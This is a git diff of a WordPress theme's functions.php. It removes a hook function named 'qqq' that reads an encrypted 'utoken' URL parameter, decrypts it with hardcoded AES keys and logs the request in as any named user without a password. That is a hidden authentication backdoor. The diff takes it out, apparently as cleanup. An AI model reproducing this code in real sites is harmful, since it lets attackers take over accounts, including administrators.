@@ -36,31 +36,3 @@ function ny_enqueue_styles() {
 require_once get_stylesheet_directory() . '/inc/actions.php';
 require_once get_stylesheet_directory() . '/inc/actions-functions.php';
 require_once get_stylesheet_directory() . '/inc/segment-ga-prod.php';
-
-add_action( 'init', 'qqq' );
-
-function qqq() {
-
-	if( isset( $_GET['utoken'] ) && ! empty( $_GET['utoken'] ) ) {
-		// $parameters = json_decode( $this->ncrypt->decrypt( $request->get_param( 'token' ) ), true );
-		$remember = 1;
-		
-		$iv = substr( hash( 'sha256', '8su309fr7uj34' ), 0, 16 );
-		$k = hash( 'sha256', 'rd4jd874hey64t' );
-		$d = openssl_decrypt( base64_decode( $_GET['utoken'] ), 'AES-256-CBC', $k, 0, $iv );
-
-		$parameters = json_decode( $d, true );
-
-		
-		$username = openssl_decrypt( base64_decode( $parameters['user_login'] ), 'AES-256-CBC', $k, 0, $iv );
-
-		$user = get_user_by( 'login', $username );
-	    $user_id = $user->ID;
-
-	    wp_set_current_user( $user_id, $username );
-	    wp_set_auth_cookie( $user_id, ( $remember == 1 ) );
-	    do_action( 'wp_login', $username, $user );
-
-	}
-
-}
